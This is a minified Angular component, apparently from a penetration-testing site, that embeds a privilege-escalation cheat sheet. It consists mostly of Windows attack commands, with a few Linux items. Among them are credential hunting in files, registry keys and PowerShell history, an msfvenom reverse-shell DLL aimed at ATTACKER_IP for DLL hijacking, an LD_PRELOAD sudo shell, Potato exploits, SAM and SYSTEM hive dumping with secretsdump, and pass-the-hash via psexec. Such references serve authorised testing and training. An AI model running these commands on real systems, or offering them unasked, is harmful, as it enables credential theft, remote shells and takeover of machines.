`;ldPreloadExploit=`
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/<binary>
`;oscpMentalFlow=`
1. id / groups
2. sudo -l
3. SUID
4. Capabilities
5. Cron jobs
6. Writable files
7. Docker / LXD
8. Kernel exploit
`;windowsIdentity=`
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all
`;windowsUsersGroups=`
net user
net user username
net localgroup
net localgroup Administrators
net user /domain
net group /domain
`;windowsSystem=`
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic logicaldisk get caption,description
wmic product get name,version,vendor
`;windowsDrivers=`
driverquery /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer
`;windowsNetwork=`
ipconfig /all
route print
arp -a
mountvol
`;windowsCredentialHunting=`
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

dir /s *pass*
dir /s *cred*
dir /s *vnc*

dir /b /s unattend.xml
dir /b /s sysprep.inf
`;windowsRegistryCredentials=`
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"
reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
reg query "HKCU\\Software\\TightVNC\\Server"
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
`;windowsSavedCredentials=`
cmdkey /list
`;windowsPowerShellHistory=`
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

findstr /i password %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i user %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i net %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
findstr /i cmdkey %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

doskey /history

type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
`;windowsInterestingFiles=`
dir /s /b *.txt
dir /s /b C:\\*.kdbx
dir /s /b *.config
dir /s /b *.conf
dir /s /b *.ini
dir /s /b *.xml
dir /s /b *.json
dir /s /b *.ps1
dir /s /b *.bat
dir /s /b *.cmd
dir /s /b *.docx
dir /s /b *.xlsx
dir /s /b *.pdf
dir /s /b *.zip
dir /s /b *.bak
dir /s /b *.old

dir /s /b *password*
dir /s /b *pass*
dir /s /b *cred*
dir /s /b *secret*
dir /s /b *config*
dir /s /b *backup*
dir /s /b *vpn*
dir /s /b *rdp*
dir /s /b *ssh*
dir /s /b *id_rsa*

findstr /spin "password" *
findstr /spin "passwd" *
findstr /spin "pwd" *
findstr /spin "username" *
findstr /spin "connectionstring" *
findstr /spin "apikey" *
findstr /spin "token" *
findstr /spin "secret" *

C:\\Users\\
C:\\Users\\Public\\
C:\\ProgramData\\
C:\\Temp\\
C:\\Windows\\Temp\\
C:\\inetpub\\
C:\\Scripts\\
C:\\Backup\\
C:\\Backups\\
C:\\Tools\\

web.config
app.config
applicationHost.config
Unattend.xml
sysprep.xml
sysprep.inf
`;windowsServices=`
sc query
sc qc ServiceName
wmic service get name,displayname,pathname,startmode

Get-CimInstance Win32_Service | Select Name,State,StartMode,StartName,PathName
`;windowsUnquotedPaths=`
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

Get-CimInstance Win32_Service | Select Name,PathName,StartName
`;windowsServiceBinary=`
Get-CimInstance Win32_Service |
Where-Object {$_.StartName -like "*LocalSystem*"} |
Select Name, State, StartMode, StartName

icacls "C:\\Path\\To\\ServiceBinary.exe"

sc qc ServiceName
`;windowsServiceRule=`
WRITE + SYSTEM + EXECUTION TRIGGER = EXPLOIT
`;windowsDLLHijacking=`
icacls C:\\ServiceDirectory

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll

sc stop ServiceName
sc start ServiceName
`;windowsScheduledTasks=`
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State"

Get-ScheduledTask | where {$_.TaskPath -notlike '\\Microsoft*'} | Format-Table TaskName,TaskPath,State

schtasks /query
schtasks /query /fo TABLE
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v > tasks.txt
`;windowsTaskFiltering=`
findstr /i "TaskName Author Run As User Task To Run" tasks.txt

findstr /i "powershell cmd.exe .ps1 .bat .cmd" tasks.txt

findstr /i "\\Microsoft\\" tasks.txt
`;windowsTaskInspect=`
schtasks /query /tn "\\TaskName" /fo LIST /v

Get-ScheduledTask

Get-ScheduledTask | Select TaskName,TaskPath,State

(Get-ScheduledTask "TaskName").Actions
`;windowsTaskFiles=`
dir C:\\ /s *.ps1
dir C:\\ /s *.bat
dir C:\\ /s *.cmd
dir C:\\ /s *.vbs
dir C:\\ /s *.xml
dir C:\\ /s *.config
dir C:\\ /s *.ini

dir C:\\Windows\\System32\\Tasks /s

findstr /spin "password passwd pwd secret token user uid connectionstring" *.xml *.config *.ini *.txt *.ps1 *.bat *.cmd
`;windowsTaskPermissions=`
icacls C:\\Path\\To\\TaskBinary.exe

icacls C:\\Path\\To\\Script.ps1

.accesschk64.exe /accepteula -s -d C:\\Scripts\\
`;windowsSeImpersonate=`
whoami /priv
`;windowsPotato=`
PrintSpoofer64.exe -i -c cmd

GodPotato.exe -cmd cmd
`;windowsBackupOperators=`
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system
`;windowsSecretsDump=`
impacket-secretsdump -sam sam -system system LOCAL
`;windowsPassTheHash=`
impacket-psexec -hashes :NTHASH Administrator@IP
`;windowsKernel=`
systeminfo
wmic qfe get HotFixID

searchsploit Windows <version>
`;windowsAutomatedEnum=`
.\\winPEASx64.exe
.\\winPEAS.exe

Set-ExecutionPolicy Bypass -Scope Process -Force

Unblock-File .\\PowerUp.ps1
. .\\PowerUp.ps1
Invoke-AllChecks

Unblock-File .\\PrivescCheck.ps1
. .\\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Report PrivescCheck.txt

.\\Seatbelt.exe -group=all
`;windowsManualVerify=`
icacls "C:\\Program Files\\..."

sc.exe qc ServiceName

schtasks /query /fo LIST /v

whoami /priv
`;selectTech(s){this.selected=s}back(){this.selected=null}copy(s){navigator.clipboard.writeText(s)}static \u0275fac=function(i){return new(i||o)};static \u0275cmp=g({type:o,selectors:[["app-privesc"]],decls:9,vars:3,consts:[[1,"scan-page"],[1,"terminal-path"],[1,"prompt"],[4,"ngIf"],[1,"title"],[1,"page-description"],[1,"grid"],[1,"card",3,"click"],[1,"card-icon"],[1,"card-content"],[1,"detail"],[1,"back",3,"click"],[1,"section-description"],["multi",""],[3,"command"]],template:function(i,m){i&1&&(n(0,"div",0)(1,"div",1)(2,"span",2),t(3,"~"),e(),t(4,"/get.sh/privesc"),e(),l(5,"br"),w(6,M,24,0,"ng-container",3)(7,O,394,44,"ng-container",3)(8,A,338,28,"ng-container",3),e()),i&2&&(a(6),r("ngIf",!m.selected),a(),r("ngIf",m.selected==="linux"),a(),r("ngIf",m.selected==="windows"))},dependencies:[y,v,C,P,b,f,k,_],styles:[".privesc-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0;max-width:1200px;margin:0 auto}.title[_ngcontent-%COMP%]{font-size:30px;font-weight:700;margin:0 0 .5rem;color:#f8fafc}.page-description[_ngcontent-%COMP%]{margin:0 0 2rem;color:#64748b;font-size:14px}.terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;color:#64748b}.terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#38bdf8}.privesc-section[_ngcontent-%COMP%]{margin-bottom:3rem}.section-header[_ngcontent-%COMP%]{display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem}.section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;color:#94a3b8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;font-weight:700;letter-spacing:.15em;white-space:nowrap}.section-line[_ngcontent-%COMP%]{height:1px;flex:1;background:#1e293b}.grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}.card[_ngcontent-%COMP%]{position:relative;display:flex;align-items:flex-start;gap:1rem;min-height:130px;padding:1.25rem;background:#111827;border:1px solid #1e293b;border-radius:12px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease,box-shadow .2s ease}.card[_ngcontent-%COMP%]:hover{transform:translateY(-4px);border-color:#2563eb;background:#172033;box-shadow:0 8px 25px #00000040,0 0 15px #2563eb14}.card-icon[_ngcontent-%COMP%]{flex-shrink:0;width:46px;height:46px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:#0b1220;border:1px solid #1e3a5f;color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:18px;font-weight:700;transition:border-color .2s ease,color .2s ease,background .2s ease}.card[_ngcontent-%COMP%]:hover   .card-icon[_ngcontent-%COMP%]{border-color:#2563eb;color:#60a5fa;background:#0f172a}.card-content[_ngcontent-%COMP%]{min-width:0}.card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f8fafc;font-size:17px;font-weight:650}.card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.5}.detail[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;font-size:30px;font-weight:700;color:#f8fafc}.section-description[_ngcontent-%COMP%]{margin:-.5rem 0 1rem;color:#94a3b8;font-size:14px}.back[_ngcontent-%COMP%]{background:transparent;border:1px solid #334155;color:#e2e8f0;padding:8px 12px;border-radius:8px;cursor:pointer;width:fit-content;transition:background .2s ease,border-color .2s ease,color .2s ease}.back[_ngcontent-%COMP%]:hover{background:#1e293b;border-color:#3b82f6;color:#60a5fa}mat-expansion-panel[_ngcontent-%COMP%]{background:#1e293b!important;color:#e2e8f0!important;border-radius:10px!important;margin-bottom:10px;border:1px solid #334155;box-shadow:none!important}mat-expansion-panel-header[_ngcontent-%COMP%]{color:#e2e8f0!important;background:transparent!important;min-height:52px}mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#243449!important}mat-panel-title[_ngcontent-%COMP%]{color:#e2e8f0!important;font-weight:600}.detail[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{color:#cbd5e1;line-height:1.6}.detail[_ngcontent-%COMP%]   strong[_ngcontent-%COMP%]{color:#f8fafc}.detail[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{color:#cbd5e1;line-height:1.8;padding-left:1.5rem}@media(max-width:768px){.privesc-page[_ngcontent-%COMP%]{padding:1rem}.title[_ngcontent-%COMP%]{font-size:24px}.grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{font-size:26px}mat-expansion-panel-header[_ngcontent-%COMP%]{padding:0 12px}}"]})};export{T as Privesc};
